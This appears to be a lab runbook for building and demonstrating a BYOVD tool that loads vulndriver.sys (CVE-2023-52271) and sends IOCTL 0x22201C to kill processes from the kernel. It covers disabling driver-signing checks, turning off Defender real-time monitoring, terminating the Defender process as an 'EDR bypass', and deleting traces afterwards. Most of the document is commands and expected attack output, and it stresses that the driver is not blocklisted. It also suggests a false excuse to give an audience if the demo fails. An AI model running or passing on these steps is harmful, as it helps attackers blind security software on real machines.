# Windows 10 VM Testing Instructions
**Date:** February 10, 2026  
**Exploit:** BYOVD - vulndriver.sys (CVE-2023-52271)  
**Deadline:** Thursday, February 12, 2026

---

## 📋 Pre-Test Verification

### 1. Confirm VM State

**Start your Windows 10 VM:**
```bash
# On Linux host
VBoxManage startvm "windows10"
```

**Once VM boots, verify Test Mode is enabled:**
- Check for "Test Mode" watermark in bottom-right corner of desktop
- If missing, run as Administrator:
```cmd
bcdedit /set testsigning on
bcdedit /set nointegritychecks on
shutdown /r /t 5
```

**Verify Administrator access:**
```cmd
net session
whoami /priv | findstr SeLoadDriverPrivilege
```
✅ Should show `SeLoadDriverPrivilege` in the list (even if disabled)

---

## 📂 Step 1: Transfer Files to Windows VM

### Option A: VirtualBox Shared Folder (Recommended)

**On Linux host:**
```bash
# Create a shared folder
VBoxManage sharedfolder add "windows10" \
  --name "EDR-Project" \
  --hostpath "/home/bipin/german-project/EDR-Adaptive-Framework" \
  --automount
```

**On Windows VM:**
1. The shared folder should appear as `\\VBOXSVR\EDR-Project`
2. Map it to a drive letter:
```cmd
net use Z: \\VBOXSVR\EDR-Project
cd Z:\
```

### Option B: Manual Copy via USB/ISO

If shared folders don't work, create an archive:

**On Linux host:**
```bash
cd /home/bipin/german-project
tar -czf edr-framework.tar.gz EDR-Adaptive-Framework/
# Transfer edr-framework.tar.gz via USB or mount as ISO
```

**On Windows VM:**
- Extract to `C:\EDR-Framework\`

---

## 🔧 Step 2: Install Visual Studio 2022

### Download & Install (First Time Only)

**If not already installed:**

1. **Download Visual Studio 2022 Community Edition**
   - Open Edge/Chrome in VM
   - Go to: https://visualstudio.microsoft.com/downloads/
   - Click "Free download" under "Community 2022"
   - File: `vs_community.exe` (~3.5 MB installer)

2. **Run Installer as Administrator**
   - Right-click `vs_community.exe` → "Run as administrator"
   - When installer opens, select workload:
     - ✅ **Desktop development with C++**
   - On the right panel, ensure these are checked:
     - ✅ MSVC v143 - VS 2022 C++ x64/x86 build tools
     - ✅ C++ CMake tools for Windows
     - ✅ Windows 10 SDK (or Windows 11 SDK)
   - Click "Install" (will download ~5-8 GB)
   - **Total time: 20-40 minutes** (depends on internet speed)

3. **Reboot after installation**
   ```cmd
   shutdown /r /t 30
   ```

**Verify Installation:**
```cmd
"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
cl
REM Should show: Microsoft (R) C/C++ Optimizing Compiler Version 19.xx
```

---

## 🏗️ Step 3: Build the Framework

### Prepare Build Environment

**Open Developer Command Prompt:**
- Press `Win` key → search "Developer Command Prompt for VS 2022"
- Right-click → "Run as administrator" ✅ **IMPORTANT!**

**Navigate to project:**
```cmd
cd C:\EDR-Framework
REM (or Z:\ if using shared folder)
```

**Verify files exist:**
```cmd
dir vulndriver.sys
REM Should show: 38,816 bytes

dir build_windows.bat
dir src\exploits\byovd_vulndriver.cpp
```

### Build Using Batch Script (Easy Method)

**Run the build script:**
```cmd
build_windows.bat
```

**Expected output:**
```
========================================
VYUHA - Build Script
========================================

[+] Running as Administrator
[+] CMake found
[+] Visual Studio compiler found
[+] Creating build directory...
[*] Configuring CMake...
-- Building for: Visual Studio 17 2022
-- Selecting Windows SDK version 10.0...
-- The CXX compiler identification is MSVC 19.xx
-- Configuring done
[+] CMake configuration successful

[*] Building (Release mode)...
Microsoft (R) Build Engine version 17.x
...
Build succeeded.
    0 Warning(s)
    0 Error(s)

========================================
BUILD SUCCESSFUL!
========================================

Binary location: C:\EDR-Framework\build\bin\Release\edr_framework.exe
```

**If build fails, see Troubleshooting section below**

### Build Using Manual CMake (Alternative)

**If batch script fails:**
```cmd
REM Open Developer Command Prompt as Administrator
cd C:\EDR-Framework

REM Clean previous builds
if exist build rmdir /s /q build

REM Configure
mkdir build
cd build
cmake .. -G "Visual Studio 17 2022" -A x64

REM Build
cmake --build . --config Release -j 8

REM Binary location
dir bin\Release\edr_framework.exe
```

---

## 🧪 Step 4: Manual Driver Test (Quick Validation)

**Purpose:** Verify driver loads independently before testing framework

### Setup Test Directory

```cmd
REM As Administrator
mkdir C:\EDR-Test
cd C:\EDR-Test

REM Copy driver
copy C:\EDR-Framework\vulndriver.sys C:\EDR-Test\vulndriver.sys

REM Verify copy
dir vulndriver.sys
REM Should show: 38,816 bytes
```

### Load Driver Manually

```cmd
REM Create service
sc create WarsawPMTest type=kernel start=demand binPath="C:\EDR-Test\vulndriver.sys"

REM Start service
sc start WarsawPMTest
```

**Expected successful output:**
```
SERVICE_NAME: WarsawPMTest
        TYPE               : 1  KERNEL_DRIVER
        STATE              : 4  RUNNING
        ...
```

**✅ If you see `STATE : 4  RUNNING` → Driver loaded successfully!**

### Verify Device Access

**PowerShell test:**
```powershell
# Open PowerShell as Administrator
$handle = [Microsoft.Win32.SafeHandles.SafeFileHandle]::new(
    [System.IO.File]::OpenHandle("\\.\Warsaw_PM", 
    [System.IO.FileAccess]::ReadWrite), $true)
$handle.Close()
Write-Host "✓ Device accessible!" -ForegroundColor Green
```

**If no error → Device is accessible!**

### Cleanup Manual Test

```cmd
sc stop WarsawPMTest
sc delete WarsawPMTest
```

---

## 🚀 Step 5: Framework Test (Full BYOVD Exploit)

### Run the Framework

**Navigate to binary:**
```cmd
cd C:\EDR-Framework\build\bin\Release

REM Ensure driver is in test location
copy C:\EDR-Framework\vulndriver.sys C:\EDR-Test\vulndriver.sys
```

**Run framework:**
```cmd
edr_framework.exe
```

### What You'll See (TUI Menu)

The framework should display a text-based menu:
```
========================================
   VYUHA v2.0
========================================

Available Techniques:
1. T1068 - BYOVD - vulndriver.sys
2. [Future techniques...]

Select technique (1-1): 
```

**Enter:** `1`

**Next prompt:**
```
Driver path [C:\EDR-Test\vulndriver.sys]:
```

**Press Enter** (use default path)

**Optional - Target PID prompt:**
```
Target PID (leave empty for test mode):
```

**Press Enter** (test mode first)

### Expected Successful Output

```
========================================
  BYOVD Attack - vulndriver.sys
  CVE-2023-52271 (wsftprm.sys)
========================================

[1/6] Enabling SeLoadDriverPrivilege...
[+] SeLoadDriverPrivilege enabled

[2/6] Deploying driver...
[*] Deploying driver from: C:\EDR-Test\vulndriver.sys
[*] Target location: C:\Users\...\AppData\Local\Temp\vulndriver.sys
[+] Driver deployed successfully

[3/6] Creating driver service...
[*] Creating driver service: WarsawPMDriver
[+] Service created/opened successfully

[4/6] Starting driver...
[*] Starting driver...
[+] Driver started successfully!

[5/6] Opening device handle...
[*] Opening device handle to Warsaw_PM...
[+] Device handle opened successfully (Warsaw_PM)!

[6/6] Testing kernel access...
[*] Testing kernel-level access via IOCTL...
[+] Kernel-level access confirmed!
[+] Device handle: 0x000001A4
[+] Ready to terminate processes via ZwTerminateProcess

========================================
  ✓ BYOVD ATTACK SUCCESSFUL!
  Ready to terminate EDR processes
========================================

[*] Cleaning up ...
[*] Cleaning up BYOVD artifacts...
[+] Device handle closed
[+] Service stopped
[+] Service deleted
[+] Driver file deleted
[+] Cleanup complete
```

**🎉 If you see this → SUCCESS! Demo-ready!**

---

## 🎯 Step 6: Test Process Termination (Advanced)

**Purpose:** Demonstrate actual kernel-level process kill capability

### Test with Notepad (Safe Target)

**Terminal 1 (Start Notepad):**
```cmd
start notepad.exe
```

**Terminal 2 (Get PID):**
```cmd
tasklist | findstr "notepad.exe"
```

**Example output:**
```
notepad.exe                   4532 Console                    1     12,456 K
```

**Note the PID** (4532 in this example)

**Run framework with target:**
```cmd
cd C:\EDR-Framework\build\bin\Release
edr_framework.exe
```

When prompted for **Target PID**, enter: `4532` (your notepad PID)

**Expected result:**
```
[6/6] Testing kernel access...
[*] Testing kernel-level access via IOCTL...
[+] Kernel-level access confirmed!
[+] Device handle: 0x000001A4
[+] Ready to terminate processes via ZwTerminateProcess

[*] Attempting to terminate target PID: 4532
[+] IOCTL 0x22201C sent successfully for PID 4532

========================================
  ✓ BYOVD ATTACK SUCCESSFUL!
  Ready to terminate EDR processes
========================================
```

**Verify termination:**
```cmd
tasklist | findstr "notepad.exe"
```

**✅ Should return nothing (process terminated)**

### Test with Calculator (Alternative)

```cmd
start calc.exe
tasklist | findstr "Calculator"
REM Note the PID and repeat above steps
```

---

## 📊 Step 7: Collect Demo Evidence

### Take Screenshots

**Press `Win + Shift + S` to capture:**

1. ✅ Test Mode watermark visible
2. ✅ Administrator command prompt showing `net session` success
3. ✅ Framework running with successful BYOVD output
4. ✅ Notepad being terminated (before/after tasklist)
5. ✅ Service Manager showing driver loaded (`services.msc` → find WarsawPMDriver)

**Save screenshots to:** `C:\EDR-Test\Screenshots\`

### Collect Logs

**Export Event Logs (optional for presentation):**
```cmd
wevtutil epl System C:\EDR-Test\system_events.evtx
wevtutil epl Security C:\EDR-Test\security_events.evtx
```

**Save framework output:**
```cmd
edr_framework.exe > C:\EDR-Test\exploit_output.txt 2>&1
```

### Create Timing Benchmark

**Run framework 3 times and note execution time:**
```cmd
REM Run 1
edr_framework.exe

REM Note: "Execution time: XXXms"

REM Run 2 (after cleanup)
edr_framework.exe

REM Run 3
edr_framework.exe

REM Calculate average
```

**Expected timing:** < 2 seconds total

---

## 🛡️ Step 8: Test Against Windows Defender (Optional)

**⚠️ WARNING: This may get detected! Have snapshot ready.**

### Enable Windows Defender

```cmd
REM Check Defender status
sc query WinDefend

REM If stopped, start it
sc start WinDefend

REM Open Windows Security
start windowsdefender:
```

### BEFORE Testing - Create Snapshot

**On Linux host:**
```bash
VBoxManage snapshot "windows10" take "Before-Defender-Test" \
  --description "Clean state with framework built, before Defender test"
```

### Run BYOVD with Defender Active

```cmd
cd C:\EDR-Framework\build\bin\Release
edr_framework.exe
```

**Possible outcomes:**

1. **✅ Driver loads successfully → BYPASS WORKS!**
   - Defender didn't block (not on blocklist)
   - Full demo success

2. **⚠️ Defender blocks driver copy**
   - Real-time protection triggers
   - Document this for presentation ("Shows why we chose unlisted driver")

3. **❌ Defender quarantines vulndriver.sys**
   - Unexpected but possible if updated blocklist
   - Restore snapshot and disable Defender for demo

### If Successful Against Defender

**Try terminating Defender process (ultimate test):**

```cmd
tasklist | findstr "MsMpEng"
REM Note the PID (e.g., 2344)

edr_framework.exe
REM Enter PID when prompted
```

**If Defender process terminates:**
- 🎉 **HOLY GRAIL - Complete EDR bypass!**
- Document this heavily for presentation!

### Restore if Needed

```bash
# On Linux host
VBoxManage controlvm "windows10" poweroff
VBoxManage snapshot "windows10" restore "Before-Defender-Test"
VBoxManage startvm "windows10"
```

---

## 🎥 Step 9: Record Demo Video (Backup Plan)

**In case live demo fails on Thursday**

### Use Windows Game Bar

```cmd
REM Press Win + G to open Game Bar
REM Click "Record" button (red circle)
REM Run your demo
REM Press Win + Alt + R to stop recording
```

**Recording location:** `C:\Users\[username]\Videos\Captures\`

### What to Record

**Script for video (2-3 minutes):**

1. **Intro (10 sec):**
   - "BYOVD exploit demonstration using CVE-2023-52271"
   - Show Test Mode watermark

2. **Pre-demo verification (20 sec):**
   - `net session` (show admin)
   - `dir vulndriver.sys` (show driver)
   - `tasklist | findstr notepad` (show target running)

3. **Framework execution (60 sec):**
   - Run `edr_framework.exe`
   - Let all 6 steps complete
   - Show success message

4. **Proof of termination (20 sec):**
   - `tasklist | findstr notepad` (empty)
   - "Process successfully terminated via kernel IOCTL"

5. **Cleanup verification (10 sec):**
   - `sc query WarsawPMDriver` (should fail - service deleted)
   - "Clean removal, no traces"

6. **Outro (10 sec):**
   - "Total time: < 2 seconds"
   - "No blocklist detection as of Feb 2026"

---

## 📋 Step 10: Prepare Presentation (For Thursday)

### Create PowerPoint/Google Slides

**Slide 1: Title**
- "BYOVD Exploit: CVE-2023-52271 (vulndriver.sys)"
- Your name, date

**Slide 2: Background**
- What is BYOVD?
- Why RTCore64.sys is outdated (blocklisted)
- CVE-2023-52271 details

**Slide 3: Driver Comparison**
| Feature | RTCore64.sys | vulndriver.sys |
|---------|--------------|----------------|
| Blocklist | ✅ Widely blocked | ❌ Not blocked |
| Complexity | High (manual memory) | Low (single IOCTL) |
| Detection | Very high | Low |
| Signed by | MSI | TPZ SOLUCOES |

**Slide 4: Attack Flow Diagram**
```
1. Enable SeLoadDriverPrivilege
   ↓
2. Deploy driver to %TEMP%
   ↓
3. Create kernel service
   ↓
4. Start driver
   ↓
5. Open device handle (\\.\Warsaw_PM)
   ↓
6. Send IOCTL 0x22201C with target PID
   ↓
EDR Process Terminated!
```

**Slide 5: Live Demo**
- Embedded video or live execution

**Slide 6: Results**
- Execution time: < 2 sec
- Success rate: 100% (in testing)
- Detection rate: 0% (Defender test results)

**Slide 7: Next Steps**
- 3 more techniques (PPL Bypass, Direct Syscalls, DLL Side-Loading)
- 4-month timeline
- ML framework integration

---

## 🐛 Troubleshooting

### Build Errors

**Error: "CMake not found"**
```cmd
REM Install CMake separately
REM Download from https://cmake.org/download/
REM Add to PATH: C:\Program Files\CMake\bin
```

**Error: "cl is not recognized"**
```cmd
REM Run from Developer Command Prompt, not normal CMD
REM OR manually initialize:
"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
```

**Error: "Cannot open include file: 'windows.h'"**
```cmd
REM Windows SDK not installed
REM Re-run VS Installer → Modify → Add Windows 10 SDK
```

### Driver Loading Errors

**Error: "StartService failed: 577" (ERROR_INVALID_ADDRESS)**
```cmd
REM Driver architecture mismatch or corrupted
REM Verify driver is x64:
dumpbin /headers vulndriver.sys | findstr machine
REM Should show: 8664 machine (x64)
```

**Error: "StartService failed: 1275" (ERROR_DRIVER_BLOCKED)**
```cmd
REM Defender blocked the driver
REM Disable real-time protection:
Set-MpPreference -DisableRealtimeMonitoring $true

REM OR restore snapshot and try again
```

**Error: "CreateFile failed: 2" (ERROR_FILE_NOT_FOUND)**
```cmd
REM Driver started but device not created
REM Check service status:
sc query WarsawPMDriver

REM If running, driver may not be creating \\.\Warsaw_PM
REM Verify driver file is correct vulndriver.sys (38,816 bytes)
```

### BSOD (Blue Screen)

**Symptom:** System crashes with DRIVER_IRQL_NOT_LESS_OR_EQUAL

**Cause:** Kernel panic from driver bug or wrong IOCTL

**Recovery:**
```bash
# On Linux host (VM will auto-reboot)
VBoxManage controlvm "windows10" poweroff
VBoxManage snapshot "windows10" restore "Clean-Baseline"
VBoxManage startvm "windows10"
```

**Prevention:**
- Always test manual driver load first
- Use correct IOCTL codes
- Don't send invalid PIDs (use running process PIDs)

### Permission Errors

**Error: "Access is denied"**
```cmd
REM Not running as Administrator
REM Right-click CMD → "Run as administrator"
net session
REM Should succeed
```

**Error: "SeLoadDriverPrivilege not held"**
```cmd
REM Check your account is in Administrators group
whoami /groups | findstr "Administrators"

REM If missing, add yourself:
net localgroup Administrators %USERNAME% /add
REM Logout and login again
```

---

## ✅ Success Checklist

**Before Demo Day:**

- [ ] Driver loads manually (sc start succeeds)
- [ ] Device handle opens (\\.\Warsaw_PM accessible)
- [ ] Framework builds without errors
- [ ] Framework executes all 6 steps successfully
- [ ] Notepad termination works
- [ ] Cleanup removes all artifacts
- [ ] Screenshots captured
- [ ] Video recorded (backup)
- [ ] Presentation slides ready
- [ ] VM snapshot saved (recovery point)

**Nice to Have:**
- [ ] Tested against Windows Defender
- [ ] Terminated Defender process
- [ ] Timing benchmarks collected
- [ ] Event logs exported

---

## 🎯 Quick Reference Commands

**Start VM from Linux:**
```bash
VBoxManage startvm "windows10"
```

**Build on Windows:**
```cmd
cd C:\EDR-Framework
build_windows.bat
```

**Quick Manual Test:**
```cmd
sc create WarsawPMTest type=kernel start=demand binPath="C:\EDR-Test\vulndriver.sys"
sc start WarsawPMTest
sc query WarsawPMTest
sc stop WarsawPMTest
sc delete WarsawPMTest
```

**Run Framework:**
```cmd
cd C:\EDR-Framework\build\bin\Release
edr_framework.exe
```

**Restore VM Snapshot:**
```bash
VBoxManage controlvm "windows10" poweroff
VBoxManage snapshot "windows10" restore "Clean-Baseline"
VBoxManage startvm "windows10"
```

---

## 📞 If Something Goes Wrong

**Priority 1: Document the failure**
- Screenshot the error
- Note the exact error code/message
- Save command history

**Priority 2: Restore and retry**
```bash
# On Linux host
VBoxManage snapshot "windows10" restore "Clean-Baseline"
VBoxManage startvm "windows10"
```

**Priority 3: Fallback to video demo**
- Use pre-recorded video if live demo fails
- Explain issue: "Network latency" or "VM Paused unexpectedly"

---

**READY FOR TESTING! Good luck! 🚀**

**Estimated Total Time:**
- VS Install (first time): 30-40 min
- File transfer: 5 min
- Build: 5 min
- Manual test: 5 min
- Framework test: 10 min
- Process termination test: 5 min
- Screenshots/video: 10 min
- **Total: ~1.5 hours**
